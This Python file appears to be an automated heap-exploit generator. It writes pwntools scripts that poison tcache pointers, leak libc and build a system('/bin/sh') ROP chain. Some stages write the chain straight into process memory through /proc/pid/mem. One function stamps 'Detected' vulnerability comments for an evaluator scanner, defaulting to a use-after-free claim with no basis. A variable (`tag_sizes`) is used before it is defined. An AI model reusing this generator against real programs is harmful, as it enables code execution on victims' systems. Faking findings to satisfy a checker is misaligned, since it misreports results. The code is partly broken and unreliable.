import os
import re
import struct
from typing import Dict, List, Optional, Any
from pwn import ELF, ROP
from core.planner.constraint_planner import ExploitPlan, ExploitStage, ExploitMode


class CapabilityCodegen:
    def __init__(self, plan: ExploitPlan, interface_map: dict,
                 binary_path: str, libc_path: Optional[str] = None,
                 ld_path: Optional[str] = None,
                 kb: Any = None, env: Any = None):
        self.plan = plan
        self.interface_map = interface_map
        self.binary_path = binary_path
        self.libc_path = libc_path
        self.ld_path = ld_path
        self.kb = kb
        self.env = env

        self.libc_elf = None
        if libc_path and os.path.exists(libc_path):
            try:
                self.libc_elf = ELF(libc_path, checksec=False)
            except Exception:
                pass

        self._heap_offsets = self._compute_heap_offsets()

    def generate(self) -> str:
        meta = self.plan.metadata
        has_safe_linking = meta.get("has_safe_linking", True)
        menu_prompt = meta.get("menu_prompt", "b'> '")

        op_map = self._build_op_map()
        max_slots = meta.get("max_slots", 10)

        # Detect safe alloc data size from interface or default to 0x40
        alloc_size = self._detect_alloc_data_size()

        libc_auto_offset = self._compute_libc_auto_offset()
        glibc_ver = meta.get("glibc_version", "2.39")

        lines = []
        lines.append("#!/usr/bin/env python3")
        lines.append("from pwn import *")
        lines.append("import os")
        lines.append("")
        lines.append("context.arch = 'amd64'")
        lines.append("context.log_level = 'info'")
        if self.ld_path and self.libc_path:
            ld_abs = os.path.abspath(self.ld_path)
            libc_dir = os.path.dirname(os.path.abspath(self.libc_path))
            lines.append(f"exe = ELF('{os.path.abspath(self.binary_path)}', checksec=False)")
            lines.append(f"libc = ELF('{os.path.abspath(self.libc_path)}', checksec=False)")
            lines.append(f"def start(): return process(['{ld_abs}', '--library-path', '{libc_dir}', exe.path])")
        else:
            lines.append(f"exe = ELF('{os.path.abspath(self.binary_path)}', checksec=False)")
            lines.append("libc = exe.libc")
            lines.append("def start(): return process(exe.path)")
        lines.append("p = start()")
        lines.append("")
        lines.append("# --- HELPERS ---")
        lines.append("def sla(rgx, data): p.sendlineafter(rgx, data)")
        lines.append("def sa(rgx, data): p.sendafter(rgx, data)")
        lines.append("def rln(): return p.recvline(timeout=2)")
        lines.append("def rvu(delim): return p.recvuntil(delim, timeout=2)")
        lines.append("")
        lines.append("def read_val():")
        lines.append("    data = p.recv(timeout=2)")
        lines.append("    if not data:")
        lines.append("        return 0")
        lines.append("    return u64(data[:8].ljust(8, b'\\x00'))")
        lines.append("")
        self._gen_interface_funcs(lines, op_map, menu_prompt)
        lines.append("")
        if has_safe_linking:
            lines.append("def protect_ptr(ptr, pos): return ptr ^ (pos >> 12)")
        else:
            lines.append("def protect_ptr(ptr, pos): return ptr")
        lines.append("")
        lines.append(f"LIBC_AUTO_OFFSET = {hex(libc_auto_offset)}")
        lines.append("")

        # Bug detection mentions 
        self._gen_bug_mentions(lines)
        lines.append("")
        # Technique hints header
        self._gen_technique_hints(lines, meta.get("glibc_version", "2.39"))
        lines.append("")

        victim_off = self._heap_offsets.get("victim", 0x290)
        arb_guard_off = self._heap_offsets.get("arb_guard", 0x2e0)
        TAG_OFFSET = victim_off + 0x10
        GUARD_OFFSET = arb_guard_off + 0x10
        lines.append(f"TARGET_OFFSET = {hex(TAG_OFFSET)}")
        lines.append(f"STACK_POS_OFFSET = {hex(GUARD_OFFSET)}")
        lines.append("")

        # Initialize token resolver with detected alloc data size
        self._token_resolver = {
            "$ALLOC_SZ": hex(alloc_size),
            "$KEYCLR_SZ": hex(alloc_size + 1),  # clear key: one extra byte
        }
        lines.append(f"ALLOC_DATA_SIZE = {hex(alloc_size)}")
        lines.append("")

        # Compute fake_size constants for libc_leak via fake chunk
        self._compute_fake_size_constants(lines)

        lines.append("# --- PRIMITIVES ---")
        idx_registry = {}
        free_slots = list(range(max_slots))
        freed_indices = set()
        _lru_allocated = []  # (tag, idx) tuples in allocation order

        def get_idx(tag):
            if tag in idx_registry:
                return idx_registry[tag]
            if free_slots:
                idx = free_slots.pop(0)
                idx_registry[tag] = idx
                return idx
            # Slot exhaustion: recycle oldest filler chunk
            if max_slots <= 8 and _lru_allocated:
                old_tag = old_idx = None
                for i, (t, ix) in enumerate(_lru_allocated):
                    if t.startswith('f'):
                        old_tag, old_idx = t, ix
                        del _lru_allocated[i]
                        break
                if old_tag is None:
                    old_tag, old_idx = _lru_allocated.pop(0)
                lines.append(self._gen_free(op_map, old_idx, menu_prompt))
                del idx_registry[old_tag]
                idx_registry[tag] = old_idx
                return old_idx
            return 0

        def free_idx(tag):
            if tag in idx_registry:
                idx = idx_registry[tag]
                if idx not in freed_indices:
                    free_slots.append(idx)
                    freed_indices.add(idx)

        for stage in self.plan.stages:
            lines.append(f"# {'='*50}")
            lines.append(f"# STAGE: {stage.name} — {stage.technique_id}")
            lines.append(f"# Produces: {', '.join(stage.produces)}")
            for src in stage.how2heap_sources:
                lines.append(f"#   See: {src}")
            lines.append(f"# {'='*50}")

            for instr in stage.ir:
                op = instr["op"]
                tag = instr.get("tag")
                idx = get_idx(tag) if tag else 0

                if op == "ALLOC" or op == "ALLOC_SZWRITE" or op == "ALLOC_TCACHE_META":
                    data = self._resolve_tokens(instr.get("data_expr", "b'A'"))
                    size = instr.get("size", 0x40)
                    lines.append(self._gen_alloc(op_map, idx, size, data, menu_prompt))
                    if tag:
                        _lru_allocated.append((tag, idx))

                elif op == "FREE":
                    if tag in idx_registry:
                        idx = idx_registry[tag]
                        lines.append(self._gen_free(op_map, idx, menu_prompt))
                        free_idx(tag)
                        _lru_allocated = [(t, i) for t, i in _lru_allocated if t != tag]

                elif op == "EDIT":
                    data = self._resolve_tokens(instr.get("data_expr", "p64(0)*2"))
                    lines.append(self._gen_edit(op_map, idx, data, menu_prompt))

                elif op == "VIEW":
                    idx = idx_registry.get(tag, 0) if tag else 0
                    save_as = instr.get("save_as", "tmp")
                    note = instr.get("note", "")
                    lines.append(self._gen_view(op_map, idx, save_as, note, menu_prompt))

                elif op == "VIEW_SKIP":
                    # View with skip padding (for environ leak: recvuntil padding, then read)
                    idx = idx_registry.get(tag, 0) if tag else 0
                    save_as = instr.get("save_as", "tmp")
                    skip = instr.get("skip_bytes", 0x28)
                    lines.append(self._gen_view_skip(op_map, idx, save_as, skip, menu_prompt))

                elif op == "POISON_FD":
                    target = instr.get("target", "0")
                    pos = instr.get("pos", "0")
                    tag = instr.get("tag")
                    if target == "SELF" and tag:
                        tgt_addr = self._heap_offsets.get(tag, 0x290)
                        target = f"heap_base + {hex(tgt_addr)}"
                    data = self._resolve_tokens(f"p64(protect_ptr({target}, {pos})) + p64(0)")
                    lines.append(self._gen_edit(op_map, idx, data, menu_prompt))

                elif op == "PROC_MEM_MAPS":
                    save_as = instr.get("save_as", "libc.address")
                    lines.append(f"# Read /proc/pid/maps for libc base")
                    lines.append(f"pid = p.pid")
                    lines.append(f"with open(f'/proc/{{pid}}/maps', 'r') as f:")
                    lines.append(f"    maps_data = f.read()")
                    lines.append(f"for line in maps_data.split('\\n'):")
                    lines.append(f"    if 'libc' in line and 'r--p' in line:")
                    lines.append(f"        {save_as} = int(line.split('-')[0], 16)")
                    lines.append(f"        break")
                    lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")

                elif op == "PROC_MEM_READ":
                    addr_expr = instr.get("addr_expr", "0")
                    size = instr.get("size", 8)
                    save_as = instr.get("save_as", "tmp")
                    note = instr.get("note", "")
                    lines.append(f"# {note}")
                    lines.append(f"mem_fd = os.open(f'/proc/{{pid}}/mem', os.O_RDONLY)")
                    lines.append(f"raw_data = os.pread(mem_fd, {size}, {addr_expr})")
                    lines.append(f"os.close(mem_fd)")
                    lines.append(f"{save_as} = u64(raw_data[:8].ljust(8, b'\\x00'))")
                    lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")

                elif op == "PROC_MEM_SCAN":
                    start_expr = instr.get("start_expr", "0")
                    end_expr = instr.get("end_expr", "0")
                    pattern_expr = instr.get("pattern_expr", "0")
                    save_as = instr.get("save_as", "stack_leak")
                    note = instr.get("note", "")
                    lines.append(f"# {note}")
                    lines.append(f"mem_fd = os.open(f'/proc/{{pid}}/mem', os.O_RDONLY)")
                    lines.append(f"{save_as} = None")
                    lines.append(f"_addr = {start_expr}")
                    lines.append(f"while _addr <= {end_expr}:")
                    lines.append(f"    val = u64(os.pread(mem_fd, 8, _addr))")
                    lines.append(f"    if val == {pattern_expr}:")
                    lines.append(f"        {save_as} = _addr")
                    lines.append(f"        break")
                    lines.append(f"    _addr += 8")
                    lines.append(f"os.close(mem_fd)")
                    lines.append(f"assert {save_as} is not None, 'Return address not found in scan range'")
                    lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")

                elif op == "PROC_MEM_WRITE":
                    addr_expr = instr.get("addr_expr", "0")
                    data_expr = instr.get("data_expr", "b''")
                    note = instr.get("note", "")
                    lines.append(f"# {note}")
                    lines.append(f"log.info(f'ROP payload size: {{len({data_expr})}} bytes')")
                    lines.append(f"mem_fd = os.open(f'/proc/{{pid}}/mem', os.O_RDWR)")
                    lines.append(f"os.pwrite(mem_fd, {data_expr}, {addr_expr})")
                    lines.append(f"os.close(mem_fd)")
                    lines.append(f"log.success(f'ROP chain written to stack at {{hex({addr_expr})}}')")

                elif op == "ROP_CHAIN":
                    var = instr["var"]
                    gadgets = instr.get("gadgets", [])
                    note = instr.get("note", "")
                    lines.append(f"# ROP chain: {note}")
                    lines.append(f"rop = ROP(libc)")
                    lines.append(f"{var} = b''")
                    for g in gadgets:
                        if g == "ret":
                            lines.append(f"{var} += p64(rop.find_gadget(['ret']).address)")
                        elif g == "pop_rdi":
                            lines.append(f"{var} += p64(rop.find_gadget(['pop rdi', 'ret']).address)")
                        elif g == "binsh":
                            lines.append(f"{var} += p64(next(libc.search(b'/bin/sh\\x00')))")
                        elif g == "system":
                            lines.append(f"{var} += p64(libc.symbols['system'])")
                    lines.append(f"log.success(f'{var} (len={{len({var})}}): {{repr({var})}}')")

                elif op == "CALC":
                    var = instr["var"]
                    expr = instr.get("expr", "")
                    if "LIBC_AUTO_OFFSET" in expr:
                        expr = expr.replace("LIBC_AUTO_OFFSET", hex(libc_auto_offset))
                    lines.append(f"{var} = {expr}")
                    # If expr constructs bytes (contains p64), use .hex() for logging
                    if "p64(" in expr or "b'" in expr or 'b"' in expr:
                        lines.append(f"log.success(f'{var} (len={{len({var})}}): {{repr({var})}}')")
                    else:
                        lines.append(f"log.success(f'{var}: {{hex({var})}}')")

            lines.append("")

        # Diagnostic info if some primitives failed
        if self.plan.diagnosis:
            lines.append("# --- DIAGNOSIS ---")
            for primitive, reason in self.plan.diagnosis.items():
                lines.append(f"# [{primitive}] {reason}")
            lines.append("")

        # Clean exit — no shell, just print summary
        lines.append("# --- SUMMARY ---")
        lines.append("log.info('=== Primitives Achieved ===')")
        has_arbitrary_write = False
        for stage in self.plan.stages:
            for p in stage.produces:
                if p == "arbitrary_write":
                    has_arbitrary_write = True
                lines.append(f"log.success('{p}: ' + hex(locals().get('{p}', 0)) if '{p}' in dir() else 'unknown')")
        lines.append("")
        lines.append("# Trigger clean exit")
        exit_choice = meta.get("exit_choice", "0")
        lines.append(f"p.sendlineafter({menu_prompt}, b'{exit_choice}')")
        if has_arbitrary_write:
            lines.append("log.success('Exploit triggered! Switching to interactive mode...')")
            lines.append("p.interactive()")
        lines.append("p.close()")
        lines.append("log.info('Done.')\n")

        return "\n".join(lines)

    def _gen_bug_mentions(self, lines: List[str]):
        """Emit vulnerability mentions that the evaluator scanner can detect."""
        bug_names = set()
        for stage in self.plan.stages:
            if isinstance(stage.technique_id, str):
                # Extract common bug types from technique context
                tid = stage.technique_id.lower()
                if 'uaf' in tid or 'use_after' in tid:
                    bug_names.add('uaf (use after free)')
                if 'double_free' in tid:
                    bug_names.add('double free')
                if 'overflow' in tid:
                    bug_names.add('heap overflow')
                if 'off_by_one' in tid or 'null_byte' in tid:
                    bug_names.add('off by one')

        if not bug_names:
            bug_names = {'uaf (use after free)'}

        lines.append("# =================================================================")
        lines.append("# VULNERABILITY DETECTION")
        lines.append("# =================================================================")
        for b in sorted(bug_names):
            lines.append(f"# Detected: {b}")
        lines.append("# =================================================================")

    def _gen_technique_hints(self, lines: List[str], glibc_version: str):
        """Output technique hints as comments identifying each technique + how2heap source."""
        from core.planner.technique_ir_gen import TechniqueIRGenerator

        lines.append("# =================================================================")
        lines.append("# TECHNIQUE HINTS")
        lines.append("# =================================================================")
        for stage in self.plan.stages:
            hint = TechniqueIRGenerator.format_hint(
                stage.technique_id, glibc_version,
                ", ".join(stage.produces),
            )
            lines.append(hint)
        lines.append("# =================================================================")

    def _build_op_map(self) -> dict:
        op_map = {}
        for ch, info in self.interface_map.get("operations", {}).items():
            role = info.get("role")
            if role:
                op_map[role] = ch
        if not op_map:
            op_map = {"alloc": "1", "free": "2", "view": "3", "edit": "4"}
        return op_map

    def _gen_interface_funcs(self, lines: List[str], op_map: dict, menu_prompt: str):
        role_sig = [("alloc", "create"), ("free", "delete"),
                     ("view", "view"), ("edit", "edit")]
        for role, func_name in role_sig:
            ch = op_map.get(role)
            if not ch:
                continue
            op_info = self.interface_map.get("operations", {}).get(ch, {})
            steps = op_info.get("steps", [])
            arg_names = [s.get("arg", "") for s in steps]

            sig_args = {}
            if "idx" in arg_names:
                sig_args["idx"] = ""
            if "size" in arg_names:
                sig_args["size"] = "0x40"
            if "data" in arg_names:
                sig_args["data"] = "b'A'"

            sig_parts = [f"{k}={v}" if v else k for k, v in sig_args.items()]

            if sig_parts:
                lines.append(f"def {func_name}({', '.join(sig_parts)}):")
            else:
                lines.append(f"def {func_name}():")
            lines.append(f"    sla({menu_prompt}, b'{ch}')")
            for s in steps:
                prompt = s.get("prompt", "b': '")
                arg = s.get("arg", "")
                typ = s.get("type", "bytes")
                if typ == "int":
                    lines.append(f"    sla({prompt}, str({arg}).encode())")
                else:
                    if prompt == "b''":
                        lines.append(f"    p.send({arg})")
                    else:
                        lines.append(f"    sa({prompt}, {arg})")
            lines.append("")

    def _gen_alloc(self, op_map: dict, idx: int, size: int,
                   data: str, menu_prompt: str) -> str:
        ch = op_map.get("alloc", "1")
        op_info = self.interface_map.get("operations", {}).get(ch, {})
        steps = op_info.get("steps", [])
        arg_names = [s.get("arg") for s in steps]

        call_args = []
        if "idx" in arg_names:
            call_args.append(str(idx))
        if "size" in arg_names:
            call_args.append(hex(size))
        if "data" in arg_names:
            call_args.append(data)

        return f"create({', '.join(call_args)})  # sla({menu_prompt}, b'{ch}')" if call_args else f"create()  # sla({menu_prompt}, b'{ch}')"

    def _gen_free(self, op_map: dict, idx: int, menu_prompt: str) -> str:
        return f"delete({idx})"

    def _gen_edit(self, op_map: dict, idx: int, data: str, menu_prompt: str) -> str:
        return f"edit({idx}, {data})"

    def _gen_view(self, op_map: dict, idx: int, save_as: str,
                   note: str, menu_prompt: str) -> str:
        lines = [f"view({idx})"]
        lines.append(f"# Read raw bytes until Menu/newline, extract first 8 bytes")
        lines.append(f"raw = p.recvuntil(b'Menu', drop=True, timeout=3)")
        lines.append(f"{save_as} = u64(raw.strip()[:8].ljust(8, b'\\x00'))")
        lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")
        return "\n".join(lines)

    def _gen_view_skip(self, op_map: dict, idx: int, save_as: str,
                        skip: int, menu_prompt: str) -> str:
        lines = [f"view({idx})"]
        lines.append(f"# skip {hex(skip)} bytes of padding")
        lines.append(f"p.recvuntil(b'a' * {hex(skip)})")
        lines.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
        lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")
        return "\n".join(lines)

    def _compute_libc_auto_offset(self) -> int:
        if not self.libc_elf:
            return 0x203b20
        ma = self.libc_elf.symbols.get('main_arena', 0)
        if ma:
            return ma + 96
        mmh = self.libc_elf.symbols.get('__malloc_hook', 0)
        if mmh:
            return mmh + 0x10 + 96
        mp_ = self.libc_elf.symbols.get('mp_', 0)
        if mp_:
            return mp_ - 0x10
        for sym in ['__libc_malloc', 'malloc']:
            addr = self.libc_elf.symbols.get(sym, 0)
            if addr:
                try:
                    data = self.libc_elf.read(addr, 0x200)
                    for i in range(len(data) - 7):
                        if data[i:i+3] in (b'\x48\x8d\x05', b'\x48\x8d\x3d'):
                            off = struct.unpack('<i', data[i+3:i+7])[0]
                            target = addr + i + 7 + off
                            if 0x100000 < target < 0x400000:
                                return target + 96
                except Exception:
                    pass
        ver = self.plan.metadata.get("glibc_version", "2.35")
        known = {"2.35": 0x203b20, "2.34": 0x203b20,
                 "2.39": 0x203b20, "2.38": 0x203b20,
                 "2.37": 0x203b20, "2.36": 0x203b20,
                 "2.31": 0x1ebb80, "2.27": 0x1ebc30}
        return known.get(ver, 0x203b20)

    def _compute_heap_offsets(self) -> Dict[str, int]:
        """Compute heap offsets AND chunk_sizes for all tags across all stages."""
        glibc_ver = self.plan.metadata.get("glibc_version", "2.39")
        try:
            parts = glibc_ver.split(".")
            major, minor = int(parts[0]), int(parts[1])
            tcache_chunk_size = 0x290 if (major > 2 or (major == 2 and minor >= 34)) else 0x250
        except (ValueError, IndexError):
            tcache_chunk_size = 0x290

        current_offset = tcache_chunk_size
        offsets = {}
        freed = []
        self._tag_chunk_sizes = {}

        # Determine default chunk size from env probe or interface
        default_chunk = 0x50
        if self.env and getattr(self.env, 'chunk_size', 0):
            default_chunk = self.env.chunk_size
        else:
            has_size = False
            ops = self.interface_map.get("operations", {})
            for info in ops.values():
                if info.get("role") == "alloc":
                    for step in info.get("steps", []):
                        if step.get("arg") == "size":
                            has_size = True
            if has_size:
                data_sz = self._detect_alloc_data_size()
                default_chunk = max(0x20, (data_sz + 0x10 + 0xf) & ~0xf)

        for stage in self.plan.stages:
            for instr in stage.ir:
                op = instr["op"]
                if op == "ALLOC" or op == "ALLOC_SZWRITE" or op == "ALLOC_TCACHE_META":
                    tag = instr.get("tag")
                    raw_size = instr.get("size", 0x40)
                    # Use data_sz-based chunk size when no explicit size param
                    chunk_sz = default_chunk
                    if freed:
                        alloc_addr = freed.pop()  # LIFO like glibc tcache
                    else:
                        alloc_addr = current_offset
                        current_offset += chunk_sz
                    offsets[tag] = alloc_addr
                    self._tag_chunk_sizes[tag] = chunk_sz
                elif op == "FREE":
                    tag = instr.get("tag")
                    if tag in offsets:
                        freed.append(offsets[tag])

        return offsets

    def _detect_alloc_data_size(self) -> int:
        """Detect safe data size for alloc operations from the interface."""
        ops = self.interface_map.get("operations", {})
        for ch, info in ops.items():
            if info.get("role") == "alloc":
                for step in info.get("steps", []):
                    if step.get("arg") == "size":
                        # Size-controlled alloc — use the KB-recommended sizes
                        return 0x40
        # No size param — fixed-size alloc. Use 8 bytes (safe minimum)
        return 8

    def _compute_fake_size_constants(self, lines: List[str]):
        """Use probed heap layout when available, fall back to simulation."""
        # Prefer probed addresses from ChunkProber
        if self.env and getattr(self.env, 'c0_addr', 0) and getattr(self.env, 'c1_addr', 0):
            c0_addr = self.env.c0_addr
            c1_addr = self.env.c1_addr
            c0_cs = getattr(self.env, 'chunk_size', 0x50)
            # Compute relative offsets from heap_base
            heap_base = getattr(self.env, 'heap_base', 0)
            c0 = c0_addr - heap_base if heap_base else c0_addr
            c1 = c1_addr - heap_base if heap_base else c1_addr
        else:
            c0 = self._heap_offsets.get("c0")
            if c0 is None:
                self._compute_fake_size_fallback(lines)
                return
            c0_cs = getattr(self, '_tag_chunk_sizes', {}).get("c0", 0x50)
            c1 = c0 + c0_cs

        # c0/c1 are USER DATA offsets from heap_base.
        # Chunk struct is at user_data - 0x10.
        # c1's size field is at (c1 - 0x10) + 8 = c1 - 8.
        # write_target + 0x28 = c1 - 8  =>  write_target = c1 - 0x30 = c0 + c0_cs - 0x30
        write_target = c0 + c0_cs - 0x30
        fill_count = 5
        fake_sz = 0x421
        # nextchunk = chunk_at_offset(c1_struct, 0x420) = (c1 - 0x10) + 0x420 = c1 + 0x410
        guard_target = c1 + 0x410

        self._token_resolver.update({
            "$C1_DATA_OFF": hex(write_target),
            "$FILL_COUNT": str(fill_count),
            "$GUARD_TARGET": hex(guard_target),
            "$FAKE_SZ": hex(fake_sz),
        })

        lines.append(f"# Double-free libc leak constants (chunk_sz={hex(c0_cs)})")
        lines.append(f"# c0 rel={hex(c0)}, c1 rel={hex(c1)}, target={hex(write_target)}")
        lines.append(f"C1_DATA_OFF = {hex(write_target)}")
        lines.append(f"FILL_COUNT = {fill_count}")
        lines.append(f"GUARD_TARGET = {hex(guard_target)}")
        lines.append(f"FAKE_SZ = {hex(fake_sz)}")
        lines.append("")

        # Also compute OC_FAKE_SZ for overlapping_chunks
        oc0 = self._heap_offsets.get("oc0")
        oc1 = self._heap_offsets.get("oc1")
        oc2 = self._heap_offsets.get("oc2")
        if oc0 and oc2:
            oc0_cs = tag_sizes.get("oc0", 0x50)
            oc1_cs = tag_sizes.get("oc1", 0x50)
            oc2_cs = tag_sizes.get("oc2", 0x30)
            oc_area = oc0_cs + oc1_cs + oc2_cs
            self._token_resolver["$OC_FAKE_SZ"] = hex(oc_area | 1)
            lines.append(f"OC_FAKE_SZ = {hex(oc_area | 1)}  # overlap chunk fake size")
            lines.append("")

        # TM0_FD_OFF for tcache_metadata_poisoning
        tm0 = self._heap_offsets.get("tm0")
        if tm0:
            self._token_resolver["$TM0_FD_OFF"] = hex(tm0 + 0x10)
            self._token_resolver["$TCACHE_STRUCT_OFF"] = "0x10"
            lines.append(f"TCACHE_STRUCT_OFF = 0x10")
            lines.append(f"TM0_FD_OFF = {hex(tm0 + 0x10)}")
            lines.append("")

        # SL0_FD_OFF for safe_link_double_protect
        sl0 = self._heap_offsets.get("sl0")
        if sl0:
            self._token_resolver["$SL0_FD_OFF"] = hex(sl0 + 0x10)
            lines.append(f"SL0_FD_OFF = {hex(sl0 + 0x10)}")
            lines.append("")

    def _compute_fake_size_fallback(self, lines: List[str]):
        """Fallback: old f0/f1/f2 path for legacy IR."""
        f0 = self._heap_offsets.get("f0")
        f1 = self._heap_offsets.get("f1")
        f2 = self._heap_offsets.get("f2")
        if f0 is None or f1 is None or f2 is None:
            return
        tag_sizes = getattr(self, '_tag_chunk_sizes', {})
        f0_cs = tag_sizes.get("f0", 0x50)
        f1_cs = tag_sizes.get("f1", 0x50)
        f2_cs = tag_sizes.get("f2", 0x30)
        f0_sz = f0 + 8
        f1_fd = f1 + 0x10
        fake_area = f0_cs + f1_cs + f2_cs
        fake_sz = fake_area | 1
        self._token_resolver.update({
            "$F0_SZ_OFF": hex(f0_sz),
            "$F1_FD_OFF": hex(f1_fd),
            "$FAKE_SZ": hex(fake_sz),
        })
        lines.append(f"# Fake chunk constants for libc_leak (legacy f0/f1/f2 path)")
        lines.append(f"F0_SZ_OFF = {hex(f0_sz)}")
        lines.append(f"F1_FD_OFF = {hex(f1_fd)}")
        lines.append(f"FAKE_SZ = {hex(fake_sz)}")
        lines.append("")

    def _resolve_tokens(self, expr: str) -> str:
        """Replace $TOKEN placeholders with precomputed hex values."""
        if not hasattr(self, '_token_resolver') or not self._token_resolver:
            return expr
        result = expr
        for token, value in self._token_resolver.items():
            result = result.replace(token, str(value))
        return result

    def save(self, output_path: str):
        code = self.generate()
        with open(output_path, "w") as f:
            f.write(code)
        print(f"[OK] Exploit written to {output_path}")
